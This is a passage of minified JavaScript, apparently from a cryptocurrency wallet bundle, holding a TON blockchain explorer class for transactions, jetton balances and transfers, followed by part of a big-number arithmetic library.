            (e, i) => {
              let [, { isMatch: s, parse: o }] = i;
              const a = s(t, n) ? o(t, { selfAddress: n, tokens: r }) : {};
              return { ...e, ...a };
            },
            e,
          );
        }
        async modifyTransactionsResponse(t) {
          const e = this.wallet.address;
          return t.reduce((t, r, n) => {
            try {
              const {
                  source: n,
                  destination: i,
                  isToken: s,
                  amount: o,
                } = this._getCoinTxInstruction(r),
                a = n && i && o;
              if (!a) return t;
              const l = "" + (0, h.toCurrency)(o, this.wallet.decimal),
                u = this.wallet.id,
                d = this.wallet.name;
              return (
                t.push(
                  new c.default({
                    ticker: this.wallet.ticker,
                    name: d,
                    alias: this.wallet.alias,
                    explorer: this.constructor.name,
                    txid: this.getTxHash(r),
                    direction: i === e,
                    otherSideAddress: i === e ? n : i,
                    amount: l,
                    datetime: this.getTxDateTime(r),
                    memo: this.getTxMemo(r),
                    confirmations: this.getTxConfirmations(r),
                    fee: this.getTxFee(r),
                    feeTicker: this.getTxFeeTicker(),
                    isToken: s,
                    walletid: u,
                  }),
                ),
                t
              );
            } catch (i) {
              return (
                console.warn(`[${this.wallet.id}] tx parse failed`),
                console.error(i),
                t
              );
            }
          }, []);
        }
        async modifyTokensTransactionsResponse(t) {
          const e = this.wallet.address;
          return (
            await this._fillMintsByJettonWalletAddressCache(),
            t.reduce((t, r, n) => {
              try {
                const {
                    source: n,
                    destination: i,
                    isToken: s,
                    amount: o,
                    decimal: a,
                    symbol: l,
                    name: d,
                    mint: f,
                  } = this._getTokenTxInstruction(r),
                  p = n && i && o,
                  w = a && l && d && f;
                if (!p || (s && !w)) return t;
                let C, g, y;
                return (
                  s
                    ? ((C = "" + (0, h.toCurrency)(o, parseInt(a, 10))),
                      (g = (0, u.getTokenId)({
                        contract: f.toLowerCase(),
                        parent: this.wallet.id,
                        ticker: l,
                      })),
                      (y = d))
                    : ((C = "" + (0, h.toCurrency)(o, this.wallet.decimal)),
                      (g = this.wallet.id),
                      (y = this.wallet.name)),
                  t.push(
                    new c.default({
                      ticker: l || this.wallet.ticker,
                      name: y,
                      alias: this.wallet.alias,
                      explorer: this.constructor.name,
                      txid: this.getTxHash(r),
                      direction: i === e,
                      otherSideAddress: i === e ? n : i,
                      amount: C,
                      datetime: this.getTxDateTime(r),
                      memo: this.getTxMemo(r),
                      confirmations: this.getTxConfirmations(r),
                      fee: this.getTxFee(r),
                      feeTicker: this.getTxFeeTicker(),
                      isToken: s,
                      symbol: l,
                      walletid: g,
                    }),
                  ),
                  t
                );
              } catch (i) {
                return (
                  console.warn(`[${this.wallet.id}] tx parse failed`),
                  console.error(i),
                  t
                );
              }
            }, [])
          );
        }
        getTransactionsUrl() {
          var t;
          return (
            ((null === (t = this.config) || void 0 === t
              ? void 0
              : t.indexApiUrl) || f) + "/getTransactionsByAddress"
          );
        }
        getTransactionsParams(t, e, r) {
          return (
            void 0 === e && (e = 0),
            void 0 === r && (r = this.defaultTxLimit),
            { address: t, limit: r, offset: e, include_msg_body: !0 }
          );
        }
        getTransactionsOptions() {
          return { headers: { "X-API-Key": API_KEY } };
        }
        getTokenBalancesUrl(t) {
          var e;
          return `${null === (e = this.config) || void 0 === e ? void 0 : e.tonapiBaseUrl}/v2/accounts/${t}/jettons`;
        }
        getTokenBalancesOptions() {
          var t;
          return {
            headers: {
              accept: "application/json",
              Authorization:
                "Bearer " +
                (null === (t = this.config) || void 0 === t
                  ? void 0
                  : t.tonapiApiKey),
            },
          };
        }
        modifyGetTokenBalancesResponse(t, e) {
          const r = {};
          return null !== t &&
            void 0 !== t &&
            t.balances &&
            Array.isArray(null === t || void 0 === t ? void 0 : t.balances)
            ? (t.balances.forEach((t) => {
                if (t.jetton && t.balance) {
                  const e = /^\d+$/.test(t.balance);
                  if (!e) return;
                  const n = t.jetton.address,
                    i = this._createAddress(n).toString(!0, !0, !0);
                  r[i] = t.balance;
                }
              }),
              r)
            : r;
        }
        getTxDataMsg(t) {
          return t.out_msgs[0] || t.in_msg;
        }
        getTxFee(t) {
          return this.wallet.toCurrencyUnit(t.fee);
        }
        getTxConfirmations() {
          return 1;
        }
        getTxDateTime(t) {
          return new Date(1e3 * t.utime);
        }
        getTxHash(t) {
          return t.hash;
        }
        getTxFeeTicker() {
          return this.wallet.ticker;
        }
        getTxMemo(t) {
          return this.getTxDataMsg(t).comment;
        }
        async getTokenBalance(t) {
          let { address: e, mint: r } = t;
          if (!e || !r)
            throw new Error(
              "Invalid parameters: address and mint are required.",
            );
          try {
            var n;
            const t = await this._getJettonWalletAddressObj(e, r),
              i = this._createJettonWallet(t),
              s = await this.taskQueue.addTask(
                this.getTaskQueueKey(["getTokenBalance", e, r]),
                async () => i.getData(),
              );
            return (
              (null === s ||
              void 0 === s ||
              null === (n = s.balance) ||
              void 0 === n
                ? void 0
                : n.toString()) || null
            );
          } catch (i) {
            return (console.warn(i), null);
          }
        }
        async getAllJettonBalances(t) {
          if (!t) throw new Error("Invalid parameters: address is required.");
          return this.taskQueue.addTask(
            this.getTaskQueueKey(["getAllJettonBalances", t]),
            async () => {
              try {
                const e = await this.request(
                  this.getTokenBalancesUrl(t),
                  this.getTokenBalancesMethod(),
                  this.getTokenBalancesParams(t),
                  "GET_ALL_JETTON_BALANCES",
                  this.getTokenBalancesOptions(),
                );
                return this.modifyGetTokenBalancesResponse(e, t);
              } catch (e) {
                return (
                  console.warn(
                    "Failed to fetch jetton balances from TonAPI:",
                    e,
                  ),
                  {}
                );
              }
            },
          );
        }
        async getTokenTransactions(t) {
          let { address: e } = t;
          return this.taskQueue.addTask(
            this.getTaskQueueKey(["getTokenTransactions", e]),
            async () => {
              const t = await this.request(
                this.getTransactionsUrl(),
                this.getTransactionsMethod(),
                this.getTransactionsParams(e),
                l.GET_TRANSACTIONS_TYPE,
                this.getTransactionsOptions(),
              );
              return this.modifyTokensTransactionsResponse(
                t,
                this.wallet.address,
              );
            },
          );
        }
        _getTonWallet(t) {
          const e = new s.default(this.provider),
            r = e.wallet.all.v3R1;
          return new r(this.provider, { publicKey: t, workchain: 0 });
        }
        async getSeqno(t) {
          const e = this._getTonWallet(t);
          return this.taskQueue.addTask(
            null,
            async () => e.methods.seqno().call().catch() || 0,
          );
        }
        async createTokenTransactionObj(t, e, r, n, i) {
          const o = this._getTonWallet(t),
            a = this._createAddress(this.wallet.address),
            l = await this._getJettonWalletAddressObj(this.wallet.address, e),
            h = this._createJettonWallet(l),
            c = await this.getSeqno(t),
            u = await this.taskQueue.addTask(null, async () =>
              h.createTransferBody({
                queryId: c,
                jettonAmount: n,
                toAddress: this._createAddress(r),
                responseAddress: a,
                forwardPayload: new Uint8Array([
                  ...new Uint8Array(4),
                  ...new TextEncoder().encode(i),
                ]),
              }),
            );
          return {
            wallet: o,
            jettonWalletAddressObj: l,
            seqno: c,
            payload: u,
            toNano: s.default.utils.toNano,
          };
        }
        async convertQueryToBoc(t) {
          return this.taskQueue.addTask(null, async () =>
            s.default.utils.bytesToBase64(await t.toBoc(!1)),
          );
        }
      }
      e.default = TonwebExplorer;
    },
    8145: function (t, e, r) {
      (function (t) {
        (function (t, e) {
          "use strict";
          function n(t, e) {
            if (!t) throw new Error(e || "Assertion failed");
          }
          function i(t, e) {
            t.super_ = e;
            var r = function () {};
            ((r.prototype = e.prototype),
              (t.prototype = new r()),
              (t.prototype.constructor = t));
          }
          function s(t, e, r) {
            if (s.isBN(t)) return t;
            ((this.negative = 0),
              (this.words = null),
              (this.length = 0),
              (this.red = null),
              null !== t &&
                (("le" !== e && "be" !== e) || ((r = e), (e = 10)),
                this._init(t || 0, e || 10, r || "be")));
          }
          var o;
          ("object" === typeof t ? (t.exports = s) : (e.BN = s),
            (s.BN = s),
            (s.wordSize = 26));
          try {
            o = r(8146).Buffer;
          } catch (T) {}
          function a(t, e, r) {
            for (
              var i = 0, s = Math.min(t.length, r), o = 0, a = e;
              a < s;
              a++
            ) {
              var l,
                h = t.charCodeAt(a) - 48;
              ((i <<= 4),
                (l =
                  h >= 49 && h <= 54
                    ? h - 49 + 10
                    : h >= 17 && h <= 22
                      ? h - 17 + 10
                      : h),
                (i |= l),
                (o |= l));
            }
            return (n(!(240 & o), "Invalid character in " + t), i);
          }
          function l(t, e, r, i) {
            for (
              var s = 0, o = 0, a = Math.min(t.length, r), l = e;
              l < a;
              l++
            ) {
              var h = t.charCodeAt(l) - 48;
              ((s *= i),
                (o = h >= 49 ? h - 49 + 10 : h >= 17 ? h - 17 + 10 : h),
                n(h >= 0 && o < i, "Invalid character"),
                (s += o));
            }
            return s;
          }
          function h(t, e) {
            ((t.words = e.words),
              (t.length = e.length),
              (t.negative = e.negative),
              (t.red = e.red));
          }
          function c() {
            return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
          }
          ((s.isBN = function (t) {
            return (
              t instanceof s ||
              (null !== t &&
                "object" === typeof t &&
                t.constructor.wordSize === s.wordSize &&
                Array.isArray(t.words))
            );
          }),
            (s.max = function (t, e) {
              return t.cmp(e) > 0 ? t : e;
            }),
            (s.min = function (t, e) {
              return t.cmp(e) < 0 ? t : e;
            }),
            (s.prototype._init = function (t, e, r) {
              if ("number" === typeof t) return this._initNumber(t, e, r);
              if ("object" === typeof t) return this._initArray(t, e, r);
              ("hex" === e && (e = 16),
                n(e === (0 | e) && e >= 2 && e <= 36),
                (t = t.toString().replace(/\s+/g, "")));
              var i = 0;
              ("-" === t[0] && i++,
                16 === e ? this._parseHex(t, i) : this._parseBase(t, e, i),
                "-" === t[0] && (this.negative = 1),
                this._strip(),
                "le" === r && this._initArray(this.toArray(), e, r));
            }),
            (s.prototype._initNumber = function (t, e, r) {
              (t < 0 && ((this.negative = 1), (t = -t)),
                t < 67108864
                  ? ((this.words = [67108863 & t]), (this.length = 1))
                  : t < 4503599627370496
                    ? ((this.words = [67108863 & t, (t / 67108864) & 67108863]),
                      (this.length = 2))
                    : (n(t < 9007199254740992),
                      (this.words = [
                        67108863 & t,
                        (t / 67108864) & 67108863,
                        1,
                      ]),
                      (this.length = 3)),
                "le" === r && this._initArray(this.toArray(), e, r));
            }),
            (s.prototype._initArray = function (t, e, r) {
              if ((n("number" === typeof t.length), t.length <= 0))
                return ((this.words = [0]), (this.length = 1), this);
              ((this.length = Math.ceil(t.length / 3)),
                (this.words = new Array(this.length)));
              for (var i = 0; i < this.length; i++) this.words[i] = 0;
              var s,
                o,
                a = 0;
              if ("be" === r)
                for (i = t.length - 1, s = 0; i >= 0; i -= 3)
                  ((o = t[i] | (t[i - 1] << 8) | (t[i - 2] << 16)),
                    (this.words[s] |= (o << a) & 67108863),
                    (this.words[s + 1] = (o >>> (26 - a)) & 67108863),
                    (a += 24),
                    a >= 26 && ((a -= 26), s++));
              else if ("le" === r)
                for (i = 0, s = 0; i < t.length; i += 3)
                  ((o = t[i] | (t[i + 1] << 8) | (t[i + 2] << 16)),
                    (this.words[s] |= (o << a) & 67108863),
                    (this.words[s + 1] = (o >>> (26 - a)) & 67108863),
                    (a += 24),
                    a >= 26 && ((a -= 26), s++));
              return this._strip();
            }),
            (s.prototype._parseHex = function (t, e) {
              ((this.length = Math.ceil((t.length - e) / 6)),
                (this.words = new Array(this.length)));
              for (var r = 0; r < this.length; r++) this.words[r] = 0;
              var n,
                i,
                s = 0;
              for (r = t.length - 6, n = 0; r >= e; r -= 6)
                ((i = a(t, r, r + 6)),
                  (this.words[n] |= (i << s) & 67108863),
                  (this.words[n + 1] |= (i >>> (26 - s)) & 4194303),
                  (s += 24),
                  s >= 26 && ((s -= 26), n++));
              (r + 6 !== e &&
                ((i = a(t, e, r + 6)),
                (this.words[n] |= (i << s) & 67108863),
                (this.words[n + 1] |= (i >>> (26 - s)) & 4194303)),
                this._strip());
            }),
            (s.prototype._parseBase = function (t, e, r) {
              ((this.words = [0]), (this.length = 1));
              for (var n = 0, i = 1; i <= 67108863; i *= e) n++;
              (n--, (i = (i / e) | 0));
              for (
                var s = t.length - r,
                  o = s % n,
                  a = Math.min(s, s - o) + r,
                  h = 0,
                  c = r;
                c < a;
                c += n
              )
                ((h = l(t, c, c + n, e)),
                  this.imuln(i),
                  this.words[0] + h < 67108864
                    ? (this.words[0] += h)
                    : this._iaddn(h));
              if (0 !== o) {
                var u = 1;
                for (h = l(t, c, t.length, e), c = 0; c < o; c++) u *= e;
                (this.imuln(u),
                  this.words[0] + h < 67108864
                    ? (this.words[0] += h)
                    : this._iaddn(h));
              }
            }),
            (s.prototype.copy = function (t) {
              t.words = new Array(this.length);
              for (var e = 0; e < this.length; e++) t.words[e] = this.words[e];
              ((t.length = this.length),
                (t.negative = this.negative),
                (t.red = this.red));
            }),
            (s.prototype._move = function (t) {
              h(t, this);
            }),
            (s.prototype.clone = function () {
              var t = new s(null);
              return (this.copy(t), t);
            }),
            (s.prototype._expand = function (t) {
              while (this.length < t) this.words[this.length++] = 0;
              return this;
            }),
            (s.prototype._strip = function () {
              while (this.length > 1 && 0 === this.words[this.length - 1])
                this.length--;
              return this._normSign();
            }),
            (s.prototype._normSign = function () {
              return (
                1 === this.length && 0 === this.words[0] && (this.negative = 0),
                this
              );
            }),
            "undefined" !== typeof Symbol && "function" === typeof Symbol.for
              ? (s.prototype[Symbol.for("nodejs.util.inspect.custom")] = c)
              : (s.prototype.inspect = c));
          var u = [
              "",
              "0",
              "00",
              "000",
              "0000",
              "00000",
              "000000",
              "0000000",
              "00000000",
              "000000000",
              "0000000000",
              "00000000000",
              "000000000000",
              "0000000000000",
              "00000000000000",
              "000000000000000",
              "0000000000000000",
              "00000000000000000",
              "000000000000000000",
              "0000000000000000000",
              "00000000000000000000",
              "000000000000000000000",
              "0000000000000000000000",
              "00000000000000000000000",
              "000000000000000000000000",
              "0000000000000000000000000",
            ],
            d = [
              0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6,
              6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5,
            ],
            f = [
              0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607,
              16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536,
              11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101,
              5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368,
              20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875,
              60466176,
            ];
          ((s.prototype.toString = function (t, e) {
            var r;
            if (((t = t || 10), (e = 0 | e || 1), 16 === t || "hex" === t)) {
              r = "";
              for (var i = 0, s = 0, o = 0; o < this.length; o++) {
                var a = this.words[o],
                  l = (16777215 & ((a << i) | s)).toString(16);
                ((s = (a >>> (24 - i)) & 16777215),
                  (r =
                    0 !== s || o !== this.length - 1
                      ? u[6 - l.length] + l + r
                      : l + r),
                  (i += 2),
                  i >= 26 && ((i -= 26), o--));
              }
              0 !== s && (r = s.toString(16) + r);
              while (r.length % e !== 0) r = "0" + r;
              return (0 !== this.negative && (r = "-" + r), r);
            }
            if (t === (0 | t) && t >= 2 && t <= 36) {
              var h = d[t],
                c = f[t];
              r = "";
              var p = this.clone();
              p.negative = 0;
              while (!p.isZero()) {
                var w = p.modrn(c).toString(t);
                ((p = p.idivn(c)),
                  (r = p.isZero() ? w + r : u[h - w.length] + w + r));
              }
              this.isZero() && (r = "0" + r);
              while (r.length % e !== 0) r = "0" + r;
              return (0 !== this.negative && (r = "-" + r), r);
            }
            n(!1, "Base should be between 2 and 36");
          }),
            (s.prototype.toNumber = function () {
              var t = this.words[0];
              return (
                2 === this.length
                  ? (t += 67108864 * this.words[1])
                  : 3 === this.length && 1 === this.words[2]
                    ? (t += 4503599627370496 + 67108864 * this.words[1])
                    : this.length > 2 &&
                      n(!1, "Number can only safely store up to 53 bits"),
                0 !== this.negative ? -t : t
              );
            }),
            (s.prototype.toJSON = function () {
              return this.toString(16, 2);
            }),
            o &&
              (s.prototype.toBuffer = function (t, e) {
                return this.toArrayLike(o, t, e);
              }),
            (s.prototype.toArray = function (t, e) {
              return this.toArrayLike(Array, t, e);
            }));
          var p = function (t, e) {
            return t.allocUnsafe ? t.allocUnsafe(e) : new t(e);
          };
          function w(t) {
            for (var e = new Array(t.bitLength()), r = 0; r < e.length; r++) {
              var n = (r / 26) | 0,
                i = r % 26;
              e[r] = (t.words[n] >>> i) & 1;
            }
            return e;
          }
          function C(t, e, r) {
            r.negative = e.negative ^ t.negative;
            var n = (t.length + e.length) | 0;
            ((r.length = n), (n = (n - 1) | 0));
            var i = 0 | t.words[0],
              s = 0 | e.words[0],
              o = i * s,
              a = 67108863 & o,
              l = (o / 67108864) | 0;
            r.words[0] = a;
            for (var h = 1; h < n; h++) {
              for (
                var c = l >>> 26,
                  u = 67108863 & l,
                  d = Math.min(h, e.length - 1),
                  f = Math.max(0, h - t.length + 1);
                f <= d;
                f++
              ) {
                var p = (h - f) | 0;
                ((i = 0 | t.words[p]),
                  (s = 0 | e.words[f]),
                  (o = i * s + u),
                  (c += (o / 67108864) | 0),
                  (u = 67108863 & o));
              }
              ((r.words[h] = 0 | u), (l = 0 | c));
            }
            return (0 !== l ? (r.words[h] = 0 | l) : r.length--, r._strip());
          }
          ((s.prototype.toArrayLike = function (t, e, r) {
            this._strip();
            var i = this.byteLength(),
              s = r || Math.max(1, i);
            (n(i <= s, "byte array longer than desired length"),
              n(s > 0, "Requested array length <= 0"));
            var o = p(t, s),
              a = "le" === e ? "LE" : "BE";
            return (this["_toArrayLike" + a](o, i), o);
          }),
            (s.prototype._toArrayLikeLE = function (t, e) {
              for (var r = 0, n = 0, i = 0, s = 0; i < this.length; i++) {
                var o = (this.words[i] << s) | n;
                ((t[r++] = 255 & o),
                  r < t.length && (t[r++] = (o >> 8) & 255),
                  r < t.length && (t[r++] = (o >> 16) & 255),
                  6 === s
                    ? (r < t.length && (t[r++] = (o >> 24) & 255),
                      (n = 0),
                      (s = 0))
                    : ((n = o >>> 24), (s += 2)));
              }
              if (r < t.length) {
                t[r++] = n;
                while (r < t.length) t[r++] = 0;
              }
            }),
            (s.prototype._toArrayLikeBE = function (t, e) {
              for (
                var r = t.length - 1, n = 0, i = 0, s = 0;
                i < this.length;
                i++
              ) {
                var o = (this.words[i] << s) | n;
                ((t[r--] = 255 & o),
                  r >= 0 && (t[r--] = (o >> 8) & 255),
                  r >= 0 && (t[r--] = (o >> 16) & 255),
                  6 === s
                    ? (r >= 0 && (t[r--] = (o >> 24) & 255), (n = 0), (s = 0))
                    : ((n = o >>> 24), (s += 2)));
              }
              if (r >= 0) {
                t[r--] = n;
                while (r >= 0) t[r--] = 0;
              }
            }),
            Math.clz32
              ? (s.prototype._countBits = function (t) {
                  return 32 - Math.clz32(t);
                })
              : (s.prototype._countBits = function (t) {
                  var e = t,
                    r = 0;
                  return (
                    e >= 4096 && ((r += 13), (e >>>= 13)),
                    e >= 64 && ((r += 7), (e >>>= 7)),
                    e >= 8 && ((r += 4), (e >>>= 4)),
                    e >= 2 && ((r += 2), (e >>>= 2)),
                    r + e
                  );
                }),
            (s.prototype._zeroBits = function (t) {
              if (0 === t) return 26;
              var e = t,
                r = 0;
              return (
                0 === (8191 & e) && ((r += 13), (e >>>= 13)),
                0 === (127 & e) && ((r += 7), (e >>>= 7)),
                0 === (15 & e) && ((r += 4), (e >>>= 4)),
                0 === (3 & e) && ((r += 2), (e >>>= 2)),
                0 === (1 & e) && r++,
                r
              );
            }),
            (s.prototype.bitLength = function () {
              var t = this.words[this.length - 1],
                e = this._countBits(t);
              return 26 * (this.length - 1) + e;
            }),
            (s.prototype.zeroBits = function () {
              if (this.isZero()) return 0;
              for (var t = 0, e = 0; e < this.length; e++) {
                var r = this._zeroBits(this.words[e]);
                if (((t += r), 26 !== r)) break;
              }
              return t;
            }),
            (s.prototype.byteLength = function () {
              return Math.ceil(this.bitLength() / 8);
            }),
            (s.prototype.toTwos = function (t) {
              return 0 !== this.negative
                ? this.abs().inotn(t).iaddn(1)
                : this.clone();
            }),
            (s.prototype.fromTwos = function (t) {
              return this.testn(t - 1)
                ? this.notn(t).iaddn(1).ineg()
                : this.clone();
            }),
            (s.prototype.isNeg = function () {
              return 0 !== this.negative;
            }),
            (s.prototype.neg = function () {
              return this.clone().ineg();
            }),
            (s.prototype.ineg = function () {
              return (this.isZero() || (this.negative ^= 1), this);
            }),
            (s.prototype.iuor = function (t) {
              while (this.length < t.length) this.words[this.length++] = 0;
              for (var e = 0; e < t.length; e++)
                this.words[e] = this.words[e] | t.words[e];
              return this._strip();
            }),
            (s.prototype.ior = function (t) {
              return (n(0 === (this.negative | t.negative)), this.iuor(t));
            }),
            (s.prototype.or = function (t) {
              return this.length > t.length
                ? this.clone().ior(t)
                : t.clone().ior(this);
            }),
            (s.prototype.uor = function (t) {
              return this.length > t.length
                ? this.clone().iuor(t)
                : t.clone().iuor(this);
            }),
            (s.prototype.iuand = function (t) {
              var e;
              e = this.length > t.length ? t : this;
              for (var r = 0; r < e.length; r++)
                this.words[r] = this.words[r] & t.words[r];
              return ((this.length = e.length), this._strip());
            }),
            (s.prototype.iand = function (t) {
              return (n(0 === (this.negative | t.negative)), this.iuand(t));
            }),
            (s.prototype.and = function (t) {
              return this.length > t.length
                ? this.clone().iand(t)
                : t.clone().iand(this);
            }),
            (s.prototype.uand = function (t) {
              return this.length > t.length
                ? this.clone().iuand(t)
                : t.clone().iuand(this);
            }),
            (s.prototype.iuxor = function (t) {
              var e, r;
              this.length > t.length
                ? ((e = this), (r = t))
                : ((e = t), (r = this));
              for (var n = 0; n < r.length; n++)
                this.words[n] = e.words[n] ^ r.words[n];
              if (this !== e)
                for (; n < e.length; n++) this.words[n] = e.words[n];
              return ((this.length = e.length), this._strip());
            }),
            (s.prototype.ixor = function (t) {
              return (n(0 === (this.negative | t.negative)), this.iuxor(t));
            }),
            (s.prototype.xor = function (t) {
              return this.length > t.length
                ? this.clone().ixor(t)
                : t.clone().ixor(this);
            }),
            (s.prototype.uxor = function (t) {
              return this.length > t.length
                ? this.clone().iuxor(t)
                : t.clone().iuxor(this);
            }),
            (s.prototype.inotn = function (t) {
              n("number" === typeof t && t >= 0);
              var e = 0 | Math.ceil(t / 26),
                r = t % 26;
              (this._expand(e), r > 0 && e--);
              for (var i = 0; i < e; i++)
                this.words[i] = 67108863 & ~this.words[i];
              return (
                r > 0 &&
                  (this.words[i] = ~this.words[i] & (67108863 >> (26 - r))),
                this._strip()
              );
            }),
            (s.prototype.notn = function (t) {
              return this.clone().inotn(t);
            }),
            (s.prototype.setn = function (t, e) {
              n("number" === typeof t && t >= 0);
              var r = (t / 26) | 0,
                i = t % 26;
              return (
                this._expand(r + 1),
                (this.words[r] = e
                  ? this.words[r] | (1 << i)
                  : this.words[r] & ~(1 << i)),
                this._strip()
              );
            }),
            (s.prototype.iadd = function (t) {
              var e, r, n;
              if (0 !== this.negative && 0 === t.negative)
                return (
                  (this.negative = 0),
                  (e = this.isub(t)),
                  (this.negative ^= 1),
                  this._normSign()
                );
              if (0 === this.negative && 0 !== t.negative)
                return (
                  (t.negative = 0),
                  (e = this.isub(t)),
                  (t.negative = 1),
                  e._normSign()
                );
              this.length > t.length
                ? ((r = this), (n = t))
                : ((r = t), (n = this));
              for (var i = 0, s = 0; s < n.length; s++)
                ((e = (0 | r.words[s]) + (0 | n.words[s]) + i),
                  (this.words[s] = 67108863 & e),
                  (i = e >>> 26));
              for (; 0 !== i && s < r.length; s++)
                ((e = (0 | r.words[s]) + i),
                  (this.words[s] = 67108863 & e),
                  (i = e >>> 26));
              if (((this.length = r.length), 0 !== i))
                ((this.words[this.length] = i), this.length++);
              else if (r !== this)
                for (; s < r.length; s++) this.words[s] = r.words[s];
              return this;
            }),
            (s.prototype.add = function (t) {
              var e;
              return 0 !== t.negative && 0 === this.negative
                ? ((t.negative = 0), (e = this.sub(t)), (t.negative ^= 1), e)
                : 0 === t.negative && 0 !== this.negative
                  ? ((this.negative = 0),
                    (e = t.sub(this)),
                    (this.negative = 1),
                    e)
                  : this.length > t.length
                    ? this.clone().iadd(t)
                    : t.clone().iadd(this);
            }),
            (s.prototype.isub = function (t) {
              if (0 !== t.negative) {
                t.negative = 0;
                var e = this.iadd(t);
                return ((t.negative = 1), e._normSign());
              }
              if (0 !== this.negative)
                return (
                  (this.negative = 0),
                  this.iadd(t),
                  (this.negative = 1),
                  this._normSign()
                );
              var r,
                n,
                i = this.cmp(t);
              if (0 === i)
                return (
                  (this.negative = 0),
                  (this.length = 1),
                  (this.words[0] = 0),
                  this
                );
              i > 0 ? ((r = this), (n = t)) : ((r = t), (n = this));
              for (var s = 0, o = 0; o < n.length; o++)
                ((e = (0 | r.words[o]) - (0 | n.words[o]) + s),
                  (s = e >> 26),
                  (this.words[o] = 67108863 & e));
              for (; 0 !== s && o < r.length; o++)
                ((e = (0 | r.words[o]) + s),
                  (s = e >> 26),
                  (this.words[o] = 67108863 & e));
              if (0 === s && o < r.length && r !== this)
                for (; o < r.length; o++) this.words[o] = r.words[o];
              return (
                (this.length = Math.max(this.length, o)),
                r !== this && (this.negative = 1),
                this._strip()
              );
            }),
            (s.prototype.sub = function (t) {
              return this.clone().isub(t);
            }));
          var g = function (t, e, r) {
            var n,
              i,
              s,
              o = t.words,
              a = e.words,
              l = r.words,
              h = 0,
              c = 0 | o[0],
              u = 8191 & c,
              d = c >>> 13,
              f = 0 | o[1],
              p = 8191 & f,
              w = f >>> 13,
              C = 0 | o[2],
              g = 8191 & C,
              y = C >>> 13,
              m = 0 | o[3],
              B = 8191 & m,
              A = m >>> 13,
              F = 0 | o[4],
              E = 8191 & F,
              b = F >>> 13,
              v = 0 | o[5],
              D = 8191 & v,
              M = v >>> 13,
              _ = 0 | o[6],
              T = 8191 & _,
              S = _ >>> 13,
              k = 0 | o[7],
              x = 8191 & k,
              I = k >>> 13,
              U = 0 | o[8],
              R = 8191 & U,
              N = U >>> 13,
              P = 0 | o[9],
              O = 8191 & P,
              K = P >>> 13,
              W = 0 | a[0],
              L = 8191 & W,
              q = W >>> 13,
              H = 0 | a[1],
              j = 8191 & H,
              V = H >>> 13,
              Q = 0 | a[2],
              J = 8191 & Q,
              G = Q >>> 13,
              z = 0 | a[3],
              Y = 8191 & z,
              Z = z >>> 13,
              X = 0 | a[4],
              $ = 8191 & X,
              tt = X >>> 13,
              et = 0 | a[5],
              rt = 8191 & et,
              nt = et >>> 13,
              it = 0 | a[6],
              st = 8191 & it,
              ot = it >>> 13,
              at = 0 | a[7],
              lt = 8191 & at,
              ht = at >>> 13,
              ct = 0 | a[8],
              ut = 8191 & ct,
              dt = ct >>> 13,
              ft = 0 | a[9],
              pt = 8191 & ft,
              wt = ft >>> 13;
            ((r.negative = t.negative ^ e.negative),
              (r.length = 19),
              (n = Math.imul(u, L)),
              (i = Math.imul(u, q)),
              (i = (i + Math.imul(d, L)) | 0),
              (s = Math.imul(d, q)));
            var Ct = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (Ct >>> 26)) | 0),
              (Ct &= 67108863),
              (n = Math.imul(p, L)),
              (i = Math.imul(p, q)),
              (i = (i + Math.imul(w, L)) | 0),
              (s = Math.imul(w, q)),
              (n = (n + Math.imul(u, j)) | 0),
              (i = (i + Math.imul(u, V)) | 0),
              (i = (i + Math.imul(d, j)) | 0),
              (s = (s + Math.imul(d, V)) | 0));
            var gt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (gt >>> 26)) | 0),
              (gt &= 67108863),
              (n = Math.imul(g, L)),
              (i = Math.imul(g, q)),
              (i = (i + Math.imul(y, L)) | 0),
              (s = Math.imul(y, q)),
              (n = (n + Math.imul(p, j)) | 0),
              (i = (i + Math.imul(p, V)) | 0),
              (i = (i + Math.imul(w, j)) | 0),
              (s = (s + Math.imul(w, V)) | 0),
              (n = (n + Math.imul(u, J)) | 0),
              (i = (i + Math.imul(u, G)) | 0),
              (i = (i + Math.imul(d, J)) | 0),
              (s = (s + Math.imul(d, G)) | 0));
            var yt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (yt >>> 26)) | 0),
              (yt &= 67108863),
              (n = Math.imul(B, L)),
              (i = Math.imul(B, q)),
              (i = (i + Math.imul(A, L)) | 0),
              (s = Math.imul(A, q)),
              (n = (n + Math.imul(g, j)) | 0),
              (i = (i + Math.imul(g, V)) | 0),
              (i = (i + Math.imul(y, j)) | 0),
              (s = (s + Math.imul(y, V)) | 0),
              (n = (n + Math.imul(p, J)) | 0),
              (i = (i + Math.imul(p, G)) | 0),
              (i = (i + Math.imul(w, J)) | 0),
              (s = (s + Math.imul(w, G)) | 0),
              (n = (n + Math.imul(u, Y)) | 0),
              (i = (i + Math.imul(u, Z)) | 0),
              (i = (i + Math.imul(d, Y)) | 0),
              (s = (s + Math.imul(d, Z)) | 0));
            var mt = (((h + n) | 0) + ((8191 & i) << 13)) | 0;
            ((h = (((s + (i >>> 13)) | 0) + (mt >>> 26)) | 0),
              (mt &= 67108863),
              (n = Math.imul(E, L)),
              (i = Math.imul(E, q)),
              (i = (i + Math.imul(b, L)) | 0),
              (s = Math.imul(b, q)),
              (n = (n + Math.imul(B, j)) | 0),
              (i = (i + Math.imul(B, V)) | 0),
              (i = (i + Math.imul(A, j)) | 0),
              (s = (s + Math.imul(A, V)) | 0),
              (n = (n + Math.imul(g, J)) | 0),
              (i = (i + Math.imul(g, G)) | 0),
              (i = (i + Math.imul(y, J)) | 0),
              (s = (s + Math.imul(y, G)) | 0),
              (n = (n + Math.imul(p, Y)) | 0),
              (i = (i + Math.imul(p, Z)) | 0),
              (i = (i + Math.imul(w, Y)) | 0),
              (s = (s + Math.imul(w, Z)) | 0),
